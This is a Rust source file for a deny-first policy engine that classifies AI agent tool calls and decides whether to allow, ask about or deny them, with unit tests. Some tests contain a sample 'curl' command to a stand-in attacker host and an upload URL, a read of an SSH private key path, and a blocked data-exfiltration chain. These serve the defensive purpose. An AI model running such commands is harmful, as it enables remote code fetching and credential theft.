//! Deny-first local policy engine for agent actions (`kotro-policy.yaml`).
//!
//! Design constraints (Phase 5 of the Local Agent Guard plan):
//! - Simple, versioned YAML — not an enterprise policy platform.
//! - Deny wins over ask wins over allow; explicit rules win over class defaults.
//! - Every decision is explainable: matched rule ID + evidence.
//! - Compiled to deterministic matchers (globs); no LLM in the blocking path.

pub mod presets;

use globset::{Glob, GlobMatcher};
use serde::{Deserialize, Serialize};

pub const POLICY_FILE: &str = "kotro-policy.yaml";

// ── Tool classification ──────────────────────────────────────────────────────

/// Deterministic tool classes. Missing/unknown metadata gets pessimistic
/// defaults (writable, destructive, open-world → `Unknown` handling).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ToolClass {
    ReadOnly,
    Write,
    Destructive,
    Credential,
    Network,
    Exec,
    Unknown,
}

impl ToolClass {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::ReadOnly => "read_only",
            Self::Write => "write",
            Self::Destructive => "destructive",
            Self::Credential => "credential",
            Self::Network => "network",
            Self::Exec => "exec",
            Self::Unknown => "unknown",
        }
    }

    /// Parse a class name (accepts `read_only`/`readonly`/`read-only` etc.).
    pub fn parse(s: &str) -> Option<Self> {
        match s.trim().to_ascii_lowercase().replace('-', "_").as_str() {
            "read_only" | "readonly" | "read" => Some(Self::ReadOnly),
            "write" => Some(Self::Write),
            "destructive" => Some(Self::Destructive),
            "credential" => Some(Self::Credential),
            "network" => Some(Self::Network),
            "exec" => Some(Self::Exec),
            "unknown" => Some(Self::Unknown),
            _ => None,
        }
    }
}

const READ_HINTS: [&str; 10] = [
    "read", "get", "list", "search", "query", "fetch_file", "stat", "describe", "grep", "glob",
];
const WRITE_HINTS: [&str; 7] = ["write", "create", "edit", "update", "patch", "move", "copy"];
const DESTRUCTIVE_HINTS: [&str; 5] = ["delete", "remove", "drop", "truncate", "destroy"];
const CREDENTIAL_HINTS: [&str; 5] = ["secret", "credential", "token", "keychain", "password"];
const NETWORK_HINTS: [&str; 7] = ["http", "fetch", "download", "upload", "browse", "web", "request"];
const EXEC_HINTS: [&str; 6] = ["exec", "shell", "bash", "run_command", "terminal", "spawn"];

/// Classify a tool from its name and (untrusted) MCP annotations.
/// Annotations are hints only: they can *downgrade risk never*, only upgrade
/// read-only claims are accepted when the name agrees.
pub fn classify_tool(name: &str, annotations: Option<&serde_json::Value>) -> ToolClass {
    let lower = name.to_ascii_lowercase();

    let name_class = if CREDENTIAL_HINTS.iter().any(|h| lower.contains(h)) {
        ToolClass::Credential
    } else if DESTRUCTIVE_HINTS.iter().any(|h| lower.contains(h)) {
        ToolClass::Destructive
    } else if EXEC_HINTS.iter().any(|h| lower.contains(h)) {
        ToolClass::Exec
    } else if NETWORK_HINTS.iter().any(|h| lower.contains(h)) {
        ToolClass::Network
    } else if WRITE_HINTS.iter().any(|h| lower.contains(h)) {
        ToolClass::Write
    } else if READ_HINTS.iter().any(|h| lower.contains(h)) {
        ToolClass::ReadOnly
    } else {
        ToolClass::Unknown
    };

    // Annotations may only make the classification *more* conservative.
    if let Some(ann) = annotations {
        let destructive = ann.get("destructiveHint").and_then(|v| v.as_bool()).unwrap_or(false);
        let open_world = ann.get("openWorldHint").and_then(|v| v.as_bool()).unwrap_or(false);
        let read_only = ann.get("readOnlyHint").and_then(|v| v.as_bool()).unwrap_or(false);
        if destructive && !matches!(name_class, ToolClass::Credential) {
            return ToolClass::Destructive;
        }
        if open_world && matches!(name_class, ToolClass::ReadOnly | ToolClass::Unknown) {
            return ToolClass::Network;
        }
        // readOnlyHint accepted only when the name doesn't contradict it.
        if read_only && matches!(name_class, ToolClass::Unknown) {
            return ToolClass::ReadOnly;
        }
    }
    name_class
}

// ── Policy schema ────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Action {
    Allow,
    Deny,
    Ask,
}

impl Action {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
            Self::Ask => "ask",
        }
    }
}

/// One policy rule. All specified matchers must match (AND semantics).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Rule {
    pub id: String,
    pub action: Option<Action>,
    /// Glob on tool name, e.g. `delete_*`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tool: Option<String>,
    /// Glob on MCP server name.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub server: Option<String>,
    /// Tool class: read_only | write | destructive | credential | network | exec | unknown.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub class: Option<ToolClass>,
    /// Glob matched against path-like strings found in tool arguments.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    /// Glob matched against host names of URLs found in tool arguments.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub domain: Option<String>,
    /// Glob on executable referenced in arguments (exec-class tools).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub executable: Option<String>,
    /// Exact server config/tool digest (pin-scoped rules).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub server_digest: Option<String>,
    /// Provenance/data label, e.g. `untrusted_web`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub data_label: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reason: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PolicyFile {
    pub version: u32,
    /// Preset name this file was generated from (informational).
    #[serde(default)]
    pub preset: String,
    /// Default action per tool class when no rule matches.
    #[serde(default)]
    pub defaults: std::collections::BTreeMap<String, Action>,
    #[serde(default)]
    pub rules: Vec<Rule>,
}

impl Default for PolicyFile {
    fn default() -> Self {
        presets::developer()
    }
}

// ── Compiled engine ──────────────────────────────────────────────────────────

struct CompiledRule {
    rule: Rule,
    action: Action,
    tool: Option<GlobMatcher>,
    server: Option<GlobMatcher>,
    path: Option<GlobMatcher>,
    domain: Option<GlobMatcher>,
    executable: Option<GlobMatcher>,
}

/// Everything known about one attempted tool call.
#[derive(Debug, Clone, Default)]
pub struct ToolCallContext {
    pub server: String,
    pub tool: String,
    pub class: ToolClass,
    /// Path-like strings extracted from arguments.
    pub paths: Vec<String>,
    /// Host names extracted from URL-like argument strings.
    pub domains: Vec<String>,
    /// Executables referenced (exec-class tools).
    pub executables: Vec<String>,
    pub server_digest: String,
    /// Session data labels currently active (provenance from correlation).
    pub data_labels: Vec<String>,
}

impl Default for ToolClass {
    fn default() -> Self {
        Self::Unknown
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct Decision {
    pub action: Action,
    /// Rule that produced the decision, or `default:<class>` / `builtin`.
    pub rule_id: String,
    /// Human-readable explanation with the matched evidence.
    pub evidence: String,
}

pub struct PolicyEngine {
    file: PolicyFile,
    deny: Vec<CompiledRule>,
    ask: Vec<CompiledRule>,
    allow: Vec<CompiledRule>,
}

impl PolicyEngine {
    pub fn compile(file: PolicyFile) -> Result<Self, String> {
        let mut deny = Vec::new();
        let mut ask = Vec::new();
        let mut allow = Vec::new();
        for rule in &file.rules {
            let action = rule.action.ok_or_else(|| {
                format!("rule '{}' is missing an action (allow|deny|ask)", rule.id)
            })?;
            let compiled = CompiledRule {
                rule: rule.clone(),
                action,
                tool: compile_glob(&rule.tool, &rule.id)?,
                server: compile_glob(&rule.server, &rule.id)?,
                path: compile_glob(&rule.path, &rule.id)?,
                domain: compile_glob(&rule.domain, &rule.id)?,
                executable: compile_glob(&rule.executable, &rule.id)?,
            };
            match action {
                Action::Deny => deny.push(compiled),
                Action::Ask => ask.push(compiled),
                Action::Allow => allow.push(compiled),
            }
        }
        Ok(Self { file, deny, ask, allow })
    }

    pub fn preset(&self) -> &str {
        &self.file.preset
    }

    /// The effective (merged) policy source, for `policy show`.
    pub fn source(&self) -> &PolicyFile {
        &self.file
    }

    /// Stable fingerprint of the effective policy (hex SHA-256). Attached to
    /// every action-plane event as `policy_revision`.
    pub fn revision(&self) -> String {
        use sha2::{Digest, Sha256};
        let bytes = serde_json::to_vec(&self.file).unwrap_or_default();
        let digest = Sha256::digest(&bytes);
        digest.iter().map(|b| format!("{b:02x}")).collect()
    }

    /// Evaluate a tool call. Deny rules are checked first, then ask, then
    /// allow, then per-class defaults. First match within each tier wins.
    pub fn evaluate(&self, ctx: &ToolCallContext) -> Decision {
        for tier in [&self.deny, &self.ask, &self.allow] {
            for c in tier.iter() {
                if let Some(evidence) = rule_matches(c, ctx) {
                    return Decision {
                        action: c.action,
                        rule_id: c.rule.id.clone(),
                        evidence: match &c.rule.reason {
                            Some(r) => format!("{evidence} — {r}"),
                            None => evidence,
                        },
                    };
                }
            }
        }
        let default = self
            .file
            .defaults
            .get(ctx.class.as_str())
            .copied()
            .unwrap_or(Action::Ask);
        Decision {
            action: default,
            rule_id: format!("default:{}", ctx.class.as_str()),
            evidence: format!(
                "no rule matched; class '{}' defaults to {}",
                ctx.class.as_str(),
                default.as_str()
            ),
        }
    }
}

fn compile_glob(pattern: &Option<String>, rule_id: &str) -> Result<Option<GlobMatcher>, String> {
    match pattern {
        None => Ok(None),
        Some(p) => Glob::new(p)
            .map(|g| Some(g.compile_matcher()))
            .map_err(|e| format!("rule '{rule_id}': invalid glob '{p}': {e}")),
    }
}

/// Returns `Some(evidence)` when all specified matchers match.
fn rule_matches(c: &CompiledRule, ctx: &ToolCallContext) -> Option<String> {
    let mut evidence: Vec<String> = Vec::new();

    if let Some(m) = &c.tool {
        if !m.is_match(&ctx.tool) {
            return None;
        }
        evidence.push(format!("tool '{}' matches '{}'", ctx.tool, m.glob()));
    }
    if let Some(m) = &c.server {
        if !m.is_match(&ctx.server) {
            return None;
        }
        evidence.push(format!("server '{}' matches '{}'", ctx.server, m.glob()));
    }
    if let Some(class) = c.rule.class {
        if class != ctx.class {
            return None;
        }
        evidence.push(format!("class is '{}'", class.as_str()));
    }
    if let Some(m) = &c.path {
        let hit = ctx.paths.iter().find(|p| m.is_match(p.as_str()))?;
        evidence.push(format!("path '{hit}' matches '{}'", m.glob()));
    }
    if let Some(m) = &c.domain {
        let hit = ctx.domains.iter().find(|d| m.is_match(d.as_str()))?;
        evidence.push(format!("domain '{hit}' matches '{}'", m.glob()));
    }
    if let Some(m) = &c.executable {
        let hit = ctx.executables.iter().find(|e| m.is_match(e.as_str()))?;
        evidence.push(format!("executable '{hit}' matches '{}'", m.glob()));
    }
    if let Some(digest) = &c.rule.server_digest {
        if digest != &ctx.server_digest {
            return None;
        }
        evidence.push(format!("server digest '{digest}'"));
    }
    if let Some(label) = &c.rule.data_label {
        if !ctx.data_labels.iter().any(|l| l == label) {
            return None;
        }
        evidence.push(format!("session carries data label '{label}'"));
    }

    if evidence.is_empty() {
        // A rule with no matchers would match everything; require intent.
        return None;
    }
    Some(evidence.join("; "))
}

// ── Argument feature extraction ──────────────────────────────────────────────

/// Extract path-like strings, URL hosts, and executables from JSON tool args.
pub fn extract_features(args: &serde_json::Value, ctx: &mut ToolCallContext) {
    walk_strings(args, &mut |s| {
        if let Some(host) = url_host(s) {
            ctx.domains.push(host);
        } else if s.starts_with('/') || s.starts_with("~/") || s.starts_with("./") || s.starts_with("../") {
            ctx.paths.push(s.to_string());
        }
    });
    if matches!(ctx.class, ToolClass::Exec) {
        if let Some(cmd) = args
            .get("command")
            .or_else(|| args.get("cmd"))
            .and_then(|v| v.as_str())
        {
            if let Some(first) = cmd.split_whitespace().next() {
                ctx.executables.push(first.to_string());
            }
        }
    }
}

fn walk_strings(v: &serde_json::Value, f: &mut impl FnMut(&str)) {
    match v {
        serde_json::Value::String(s) => f(s),
        serde_json::Value::Array(a) => a.iter().for_each(|x| walk_strings(x, f)),
        serde_json::Value::Object(o) => o.values().for_each(|x| walk_strings(x, f)),
        _ => {}
    }
}

fn url_host(s: &str) -> Option<String> {
    let rest = s.strip_prefix("https://").or_else(|| s.strip_prefix("http://"))?;
    let host = rest.split(['/', '?', '#']).next()?;
    let host = host.split('@').next_back()?; // strip userinfo
    let host = host.split(':').next()?; // strip port
    if host.is_empty() {
        None
    } else {
        Some(host.to_string())
    }
}

// ── Loading ──────────────────────────────────────────────────────────────────

fn read_policy_file(path: &std::path::Path) -> Result<PolicyFile, String> {
    let raw =
        std::fs::read_to_string(path).map_err(|e| format!("read {}: {e}", path.display()))?;
    let file: PolicyFile =
        serde_yaml::from_str(&raw).map_err(|e| format!("parse {}: {e}", path.display()))?;
    if file.version != 1 {
        return Err(format!(
            "{}: unsupported policy version {} (expected 1)",
            path.display(),
            file.version
        ));
    }
    Ok(file)
}

/// Layer a workspace `override` policy on top of a `base` policy.
///
/// Merge semantics keep the base's safety floor while letting a workspace tune
/// it: per-class defaults are overridden by the workspace, and workspace rules
/// are prepended so they win *within* a precedence tier — but deny-first
/// precedence across tiers still applies, so a workspace `allow` can never
/// override a base `deny`.
pub fn merge_policy(mut base: PolicyFile, over: PolicyFile) -> PolicyFile {
    if !over.preset.is_empty() {
        base.preset = format!("{}+workspace", over.preset);
    } else {
        base.preset = format!("{}+workspace", base.preset);
    }
    for (class, action) in over.defaults {
        base.defaults.insert(class, action);
    }
    let mut rules = over.rules;
    rules.extend(base.rules);
    base.rules = rules;
    base
}

/// Resolve the effective policy engine and the source paths that formed it.
///
/// Base is `<state_dir>/kotro-policy.yaml` when present, otherwise the preset
/// named by the workspace file (or `developer` as the safety floor). A
/// workspace `kotro-policy.yaml` is then layered on top via [`merge_policy`].
pub fn resolve_policy(
    workspace: Option<&std::path::Path>,
    state_dir: Option<&std::path::Path>,
) -> Result<(PolicyFile, Vec<std::path::PathBuf>), String> {
    let ws_path = workspace.map(|w| w.join(POLICY_FILE)).filter(|p| p.is_file());
    let sd_path = state_dir.map(|s| s.join(POLICY_FILE)).filter(|p| p.is_file());

    let ws_file = match &ws_path {
        Some(p) => Some(read_policy_file(p)?),
        None => None,
    };
    let mut sources: Vec<std::path::PathBuf> = Vec::new();

    let base = if let Some(p) = &sd_path {
        sources.push(p.clone());
        read_policy_file(p)?
    } else if let Some(name) = ws_file.as_ref().map(|f| f.preset.as_str()).filter(|n| !n.is_empty()) {
        presets::by_name(name).unwrap_or_else(presets::developer)
    } else {
        presets::developer()
    };

    let effective = match (ws_file, &ws_path) {
        (Some(ws), Some(p)) => {
            sources.push(p.clone());
            merge_policy(base, ws)
        }
        _ => base,
    };
    Ok((effective, sources))
}

/// Resolve and compile the effective policy. See [`resolve_policy`].
pub fn load_policy(
    workspace: Option<&std::path::Path>,
    state_dir: Option<&std::path::Path>,
) -> Result<PolicyEngine, String> {
    let (file, _sources) = resolve_policy(workspace, state_dir)?;
    PolicyEngine::compile(file)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn ctx(tool: &str, class: ToolClass) -> ToolCallContext {
        ToolCallContext {
            server: "files".into(),
            tool: tool.into(),
            class,
            ..Default::default()
        }
    }

    #[test]
    fn classify_by_name() {
        assert_eq!(classify_tool("read_file", None), ToolClass::ReadOnly);
        assert_eq!(classify_tool("delete_repo", None), ToolClass::Destructive);
        assert_eq!(classify_tool("run_command", None), ToolClass::Exec);
        assert_eq!(classify_tool("http_request", None), ToolClass::Network);
        assert_eq!(classify_tool("get_secret_value", None), ToolClass::Credential);
        assert_eq!(classify_tool("frobnicate", None), ToolClass::Unknown);
    }

    #[test]
    fn annotations_only_upgrade_risk() {
        // destructiveHint upgrades a "read" name.
        assert_eq!(
            classify_tool("read_file", Some(&json!({"destructiveHint": true}))),
            ToolClass::Destructive
        );
        // readOnlyHint cannot launder an exec-named tool.
        assert_eq!(
            classify_tool("run_shell", Some(&json!({"readOnlyHint": true}))),
            ToolClass::Exec
        );
        // readOnlyHint accepted for unknown names.
        assert_eq!(
            classify_tool("frobnicate", Some(&json!({"readOnlyHint": true}))),
            ToolClass::ReadOnly
        );
    }

    #[test]
    fn deny_wins_over_allow() {
        let file = PolicyFile {
            version: 1,
            preset: "test".into(),
            defaults: Default::default(),
            rules: vec![
                Rule {
                    id: "allow-all-files".into(),
                    action: Some(Action::Allow),
                    server: Some("files".into()),
                    ..Default::default()
                },
                Rule {
                    id: "deny-destructive".into(),
                    action: Some(Action::Deny),
                    class: Some(ToolClass::Destructive),
                    ..Default::default()
                },
            ],
        };
        let engine = PolicyEngine::compile(file).unwrap();
        let d = engine.evaluate(&ctx("delete_file", ToolClass::Destructive));
        assert_eq!(d.action, Action::Deny);
        assert_eq!(d.rule_id, "deny-destructive");
        // Evidence is populated for explainability.
        assert!(d.evidence.contains("destructive"));
    }

    #[test]
    fn path_glob_matching() {
        let file = PolicyFile {
            version: 1,
            preset: "test".into(),
            defaults: [("read_only".to_string(), Action::Allow)].into_iter().collect(),
            rules: vec![Rule {
                id: "deny-ssh".into(),
                action: Some(Action::Deny),
                path: Some("**/.ssh/**".into()),
                ..Default::default()
            }],
        };
        let engine = PolicyEngine::compile(file).unwrap();
        let mut c = ctx("read_file", ToolClass::ReadOnly);
        c.paths.push("/Users/me/.ssh/id_rsa".into());
        let d = engine.evaluate(&c);
        assert_eq!(d.action, Action::Deny);
        assert!(d.evidence.contains(".ssh"));

        // Same tool without the sensitive path is allowed by the class default.
        let d = engine.evaluate(&ctx("read_file", ToolClass::ReadOnly));
        assert_eq!(d.action, Action::Allow);
        assert_eq!(d.rule_id, "default:read_only");
    }

    #[test]
    fn workspace_override_cannot_relax_base_deny() {
        // Base denies ssh; workspace tries to allow all reads. Deny wins.
        let base = presets::developer();
        let over = PolicyFile {
            version: 1,
            preset: "".into(),
            defaults: [("read_only".to_string(), Action::Allow)].into_iter().collect(),
            rules: vec![Rule {
                id: "ws-allow-reads".into(),
                action: Some(Action::Allow),
                class: Some(ToolClass::ReadOnly),
                ..Default::default()
            }],
        };
        let merged = merge_policy(base, over);
        assert!(merged.preset.ends_with("+workspace"));
        let engine = PolicyEngine::compile(merged).unwrap();
        let mut c = ctx("read_file", ToolClass::ReadOnly);
        c.paths.push("/Users/me/.ssh/id_rsa".into());
        let d = engine.evaluate(&c);
        assert_eq!(d.action, Action::Deny, "base deny must survive workspace allow");
        assert_eq!(d.rule_id, "deny-ssh-keys");
    }

    #[test]
    fn workspace_override_can_add_denies_and_defaults() {
        let base = presets::developer();
        let over = PolicyFile {
            version: 1,
            preset: "developer".into(),
            defaults: [("network".to_string(), Action::Deny)].into_iter().collect(),
            rules: vec![Rule {
                id: "ws-deny-corp-tool".into(),
                action: Some(Action::Deny),
                tool: Some("internal_*".into()),
                ..Default::default()
            }],
        };
        let engine = PolicyEngine::compile(merge_policy(base, over)).unwrap();
        // Workspace default tightened network to deny.
        let d = engine.evaluate(&ctx("http_get", ToolClass::Network));
        assert_eq!(d.action, Action::Deny);
        assert_eq!(d.rule_id, "default:network");
        // Workspace-added rule fires.
        let d = engine.evaluate(&ctx("internal_wipe", ToolClass::Write));
        assert_eq!(d.action, Action::Deny);
        assert_eq!(d.rule_id, "ws-deny-corp-tool");
    }

    #[test]
    fn resolve_uses_workspace_preset_as_base_floor() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(POLICY_FILE),
            "version: 1\npreset: developer\nrules:\n  - id: ws-x\n    action: allow\n    tool: my_tool\n",
        )
        .unwrap();
        let (file, sources) = resolve_policy(Some(dir.path()), None).unwrap();
        assert_eq!(sources.len(), 1);
        // Base = developer preset (from `preset:`), so baseline ssh deny remains.
        assert!(file.rules.iter().any(|r| r.id == "deny-ssh-keys"));
        assert!(file.rules.iter().any(|r| r.id == "ws-x"));
    }

    #[test]
    fn unknown_class_defaults_to_ask() {
        let engine = PolicyEngine::compile(PolicyFile {
            version: 1,
            preset: "test".into(),
            defaults: Default::default(),
            rules: vec![],
        })
        .unwrap();
        let d = engine.evaluate(&ctx("frobnicate", ToolClass::Unknown));
        assert_eq!(d.action, Action::Ask);
    }

    #[test]
    fn data_label_rule_blocks_exfil_chain() {
        let file = PolicyFile {
            version: 1,
            preset: "test".into(),
            defaults: [("network".to_string(), Action::Allow)].into_iter().collect(),
            rules: vec![Rule {
                id: "trifecta-block".into(),
                action: Some(Action::Deny),
                class: Some(ToolClass::Network),
                data_label: Some("sensitive_read".into()),
                reason: Some("network egress after sensitive read in a poisoned session".into()),
                ..Default::default()
            }],
        };
        let engine = PolicyEngine::compile(file).unwrap();

        let mut c = ctx("http_request", ToolClass::Network);
        c.data_labels.push("sensitive_read".into());
        let d = engine.evaluate(&c);
        assert_eq!(d.action, Action::Deny);
        assert_eq!(d.rule_id, "trifecta-block");

        // Clean session: allowed.
        let d = engine.evaluate(&ctx("http_request", ToolClass::Network));
        assert_eq!(d.action, Action::Allow);
    }

    #[test]
    fn feature_extraction() {
        let mut c = ctx("run_command", ToolClass::Exec);
        extract_features(
            &json!({
                "command": "curl https://evil.example/x",
                "cwd": "/tmp/work",
                "urls": ["http://collector.example:8443/upload"]
            }),
            &mut c,
        );
        assert!(c.paths.contains(&"/tmp/work".to_string()));
        assert!(c.domains.contains(&"collector.example".to_string()));
        assert!(c.executables.contains(&"curl".to_string()));
    }

    #[test]
    fn presets_compile() {
        for preset in [presets::observe(), presets::developer(), presets::locked_down()] {
            PolicyEngine::compile(preset).unwrap();
        }
    }

    #[test]
    fn locked_down_denies_destructive_by_default() {
        let engine = PolicyEngine::compile(presets::locked_down()).unwrap();
        let d = engine.evaluate(&ctx("delete_file", ToolClass::Destructive));
        assert_eq!(d.action, Action::Deny);
        let d = engine.evaluate(&ctx("read_file", ToolClass::ReadOnly));
        assert_eq!(d.action, Action::Ask);
    }

    #[test]
    fn observe_allows_everything() {
        let engine = PolicyEngine::compile(presets::observe()).unwrap();
        for class in [ToolClass::Destructive, ToolClass::Exec, ToolClass::Unknown] {
            assert_eq!(engine.evaluate(&ctx("x", class)).action, Action::Allow);
        }
    }

    #[test]
    fn yaml_roundtrip() {
        let yaml = serde_yaml::to_string(&presets::developer()).unwrap();
        let parsed: PolicyFile = serde_yaml::from_str(&yaml).unwrap();
        assert_eq!(parsed.version, 1);
        PolicyEngine::compile(parsed).unwrap();
    }


    #[test]
    fn revision_is_stable_for_same_policy() {
        let a = PolicyEngine::compile(presets::developer()).unwrap();
        let b = PolicyEngine::compile(presets::developer()).unwrap();
        assert_eq!(a.revision(), b.revision());
        assert_eq!(a.revision().len(), 64);
        let locked = PolicyEngine::compile(presets::locked_down()).unwrap();
        assert_ne!(a.revision(), locked.revision());
    }
}
